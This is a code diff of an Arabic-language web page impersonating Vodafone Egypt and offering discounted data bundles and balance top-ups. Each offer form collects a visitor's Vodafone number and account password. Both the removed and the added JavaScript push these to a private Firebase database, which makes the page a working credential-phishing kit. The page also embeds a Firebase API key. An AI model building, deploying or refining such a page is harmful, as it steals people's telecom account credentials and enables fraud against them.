@@ -1,15 +1,13 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>تفعيل باقات فودافون</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Cairo&display=swap');
-
     body {
       background-color: #7b0000;
       color: white;
@@ -54,12 +52,6 @@
       font-weight: bold;
       margin-top: 10px;
       cursor: pointer;
-      user-select: none;
-      transition: background 0.3s ease;
-    }
-    .btn:hover {
-      background: #ff4d4d;
-      color: white;
     }
 
     input {
@@ -69,8 +61,6 @@
       padding: 10px;
       border-radius: 8px;
       border: none;
-      font-size: 16px;
-      text-align: center;
     }
 
     .conditions {
@@ -86,59 +76,19 @@
       direction: ltr;
     }
 
-    .popup {
+    #successPopup {
       position: fixed;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
       background: white;
       color: #7b0000;
-      padding: 25px 40px;
+      padding: 30px;
       border-radius: 15px;
       font-size: 18px;
       font-weight: bold;
       display: none;
-      z-index: 9999;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
-      animation: popupFade 0.5s ease-in-out;
-    }
-
-    @keyframes popupFade {
-      from {
-        opacity: 0;
-        transform: translate(-50%, -40%);
-      }
-      to {
-        opacity: 1;
-        transform: translate(-50%, -50%);
-      }
-    }
-
-    #costDisplay {
-      font-size: 14px;
-      color: #ffebeb;
-      margin-top: 5px;
-      height: 20px;
-    }
-
-    .snowflake {
-      position: fixed;
-      top: -20px;
-      width: 10px;
-      height: 10px;
-      background: white;
-      border-radius: 50%;
-      opacity: 0.7;
-      animation: fall linear infinite;
-      z-index: 0;
-      pointer-events: none;
-    }
-
-    @keyframes fall {
-      to {
-        transform: translateY(100vh);
-        opacity: 0;
-      }
+      z-index: 999;
     }
   </style>
 </head>
@@ -152,9 +102,9 @@
       <h2>13000 فليكس</h2>
       <p>240 جنيه</p>
       <div class="conditions">شروط: لا يكون عليك سلف أو نوتة - التفعيل خلال ساعتين من إرسال الرقم وكلمة المرور</div>
-      <input type="text" placeholder="رقم فودافون" id="num" />
-      <input type="password" placeholder="كلمة المرور" id="pass1" />
-      <div class="btn" onclick="sendData('فليكس 13000', 'num', 'pass1')">تفعيل الآن</div>
+      <input type="text" placeholder="رقم فودافون" id="num1">
+      <input type="password" placeholder="كلمة المرور" id="pass1">
+      <div class="btn" onclick="sendData('فليكس 13000', 'num1', 'pass1')">تفعيل الآن</div>
     </div>
 
     <!-- 40 جيجا -->
@@ -162,9 +112,9 @@
       <h2>40 جيجا</h2>
       <p>330 جنيه</p>
       <div class="conditions">شروط: التفعيل حتى لو عليك سلف أو نوتة - خلال 72 ساعة من إرسال الرقم وكلمة المرور</div>
-      <input type="text" placeholder="رقم فودافون" id="numm" />
-      <input type="password" placeholder="كلمة المرور" id="pass2" />
-      <div class="btn" onclick="sendData('40 جيجا', 'numm', 'pass2')">تفعيل الآن</div>
+      <input type="text" placeholder="رقم فودافون" id="num2">
+      <input type="password" placeholder="كلمة المرور" id="pass2">
+      <div class="btn" onclick="sendData('40 جيجا', 'num2', 'pass2')">تفعيل الآن</div>
     </div>
 
     <!-- رصيد صافي -->
@@ -172,19 +122,19 @@
       <h2>شحن رصيد صافي</h2>
       <p>اكتب الكمية واحسب</p>
       <div class="conditions">يتم إرسال الرصيد خلال نصف ساعة من إدخال الرقم</div>
-      <input type="text" placeholder="رقم فودافون" id="eg" />
-      <input type="number" placeholder="كمية الصافي" id="egg" min="0" step="0.01" />
+      <input type="text" placeholder="رقم فودافون" id="num3">
+      <input type="number" placeholder="كمية الصافي" id="eg3">
       <p id="costDisplay"></p>
-      <div class="btn" onclick="sendBalance()">شحن الآن</div>
+      <div class="btn" onclick="sendData('رصيد صافي', 'num3', '', 'eg3')">شحن الآن</div>
     </div>
 
     <footer>Developed by: mahmoud gamal</footer>
   </div>
 
-  <div class="popup" id="popupSuccess">✅ تم إرسال الطلب بنجاح</div>
+  <div id="successPopup">تم إرسال الطلب بنجاح</div>
 
   <script>
-    // Firebase Config
+    // Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
       authDomain: "starkoscript.firebaseapp.com",
@@ -197,122 +147,47 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // حساب السعر وعرضه
-    const egInput = document.getElementById("egg");
+    // حساب التكلفة
     const costDisplay = document.getElementById("costDisplay");
-
-    egInput.addEventListener("input", () => {
-      const val = parseFloat(egInput.value);
-      if (!isNaN(val) && val > 0) {
-        const final = (val * 1.2).toFixed(2);
-        costDisplay.textContent = `المبلغ المطلوب: ${final} جنيه`;
-      } else {
-        costDisplay.textContent = "";
-      }
-    });
-
-    // إرسال بيانات باقات 13000 و 40 جيجا
-    function sendData(type, numId, passId) {
-      const num = document.getElementById(numId).value.trim();
-      const pass = document.getElementById(passId).value.trim();
-
-      if (!num || !pass) {
-        alert("يرجى تعبئة جميع الحقول");
-        return;
-      }
-
-      let data = {};
-
-      if (type === "فليكس 13000") {
-        data = {
-          text1: `طلب باقة: ${type}`,
-          num: num,
-          pass1: pass
-        };
-      } else if (type === "40 جيجا") {
-        data = {
-          text2: `طلب باقة: ${type}`,
-          numm: num,
-          pass2: pass
-        };
-      }
-
-      db.ref("starkoo")
-        .push(data)
-        .then(() => {
-          showPopup();
-          clearInputs(numId, passId);
-        })
-        .catch((err) => {
-          alert("حدث خطأ أثناء الإرسال");
-          console.error(err);
-        });
-    }
-
-    // إرسال بيانات رصيد صافي
-    function sendBalance() {
-      const num = document.getElementById("eg").value.trim();
-      const amount = parseFloat(document.getElementById("egg").value);
-
-      if (!num || isNaN(amount) || amount <= 0) {
-        alert("يرجى إدخال الرقم وقيمة الرصيد بشكل صحيح");
-        return;
-      }
-
-      const total = (amount * 1.2).toFixed(2);
-
-      const data = {
-        text3: `طلب رصيد صافي بقيمة ${amount}ج`,
-        eg: num,
-        egg: total
-      };
-
-      db.ref("starkoo")
-        .push(data)
-        .then(() => {
-          showPopup();
-          clearInputs("eg", "egg");
+    const egInput = document.getElementById("eg3");
+    if (egInput) {
+      egInput.addEventListener("input", () => {
+        const val = parseFloat(egInput.value);
+        if (!isNaN(val)) {
+          costDisplay.textContent = `المبلغ المطلوب: ${val * 1.2} جنيه`;
+        } else {
           costDisplay.textContent = "";
-        })
-        .catch((err) => {
-          alert("حدث خطأ أثناء الإرسال");
-          console.error(err);
-        });
+        }
+      });
     }
 
-    // إظهار نافذة النجاح
+    // إرسال البيانات
+    function sendData(type, numId, passId = '', egId = '') {
+      const num = document.getElementById(numId).value;
+      const pass = passId ? document.getElementById(passId).value : "";
+      const eg = egId ? document.getElementById(egId).value : "";
+
+      db.ref("vodafonedb").push({
+        type,
+        num,
+        pass,
+        eg
+      }).then(() => {
+        showPopup();
+      }).catch((err) => {
+        alert("حدث خطأ أثناء الإرسال");
+        console.error(err);
+      });
+    }
+
+    // عرض رسالة النجاح
     function showPopup() {
-      const popup = document.getElementById("popupSuccess");
+      const popup = document.getElementById("successPopup");
       popup.style.display = "block";
       setTimeout(() => {
         popup.style.display = "none";
       }, 3000);
     }
-
-    // مسح الحقول بعد الإرسال
-    function clearInputs(...ids) {
-      ids.forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.value = "";
-      });
-    }
-
-    // تأثير تساقط التلج
-    function createSnowflake() {
-      const snowflake = document.createElement("div");
-      snowflake.classList.add("snowflake");
-      snowflake.style.left = Math.random() * window.innerWidth + "px";
-      snowflake.style.animationDuration = 3 + Math.random() * 5 + "s";
-      snowflake.style.opacity = Math.random();
-      snowflake.style.width = snowflake.style.height = (5 + Math.random() * 10) + "px";
-      document.body.appendChild(snowflake);
-
-      setTimeout(() => {
-        snowflake.remove();
-      }, 7000);
-    }
-
-    setInterval(createSnowflake, 200);
   </script>
 </body>
 </html>
